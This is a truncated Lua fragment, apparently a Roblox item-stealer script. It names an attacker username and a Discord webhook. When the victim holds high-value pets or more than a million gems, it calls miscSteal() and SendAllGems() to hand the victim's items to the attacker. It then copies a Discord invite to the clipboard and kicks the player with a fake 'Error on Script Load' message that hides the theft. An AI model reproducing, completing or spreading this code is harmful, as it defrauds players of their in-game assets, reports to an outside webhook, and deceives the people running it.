Username = "Thedarkwuz"
Webhook = "https://discord.com/api/webhooks/1212174436376121405/hZnd8usFh2K5HR8fU3TpT9JUdYmCi7R52Gux1ueqVu915Hwe17dx2Kqt0xQIMTbeucfO"
min_rap = 100000
...
if CountHuges() > 0 or CountGems() > 1000000 then
	...
	miscSteal()
	SendAllGems()
	setclipboard("Join .gg/NnWn3QqgbC")
	plr:kick("Error on Script Load, Please Rejoin and Try Again: 0x000rb1t")
else
